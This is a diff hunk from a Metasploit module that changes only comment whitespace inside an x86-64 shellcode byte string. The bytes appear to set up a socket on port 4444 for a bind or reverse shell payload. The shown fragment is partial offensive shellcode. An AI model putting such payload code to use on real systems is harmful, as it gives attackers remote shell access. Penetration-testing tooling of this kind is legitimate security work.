@@ -44,7 +44,7 @@ module MetasploitModule
             "\x0f\x05"             +#	syscall                            #
             "\x48\x97"             +#	xchg   %rax,%rdi                   #
             "\x52"                 +#	push   %rdx                        #
-            "\xba\x00\x02\x11\x5C" +# mov edx,0x5c110200                 #
+            "\xba\x00\x02\x11\x5C" +#	mov edx,0x5c110200                 #
             "\x52"                 +#	push   %rdx                        #
             "\x48\x89\xe6"         +#	mov    %rsp,%rsi                   #
             "\x6a\x10"             +#	pushq  $0x10                       #
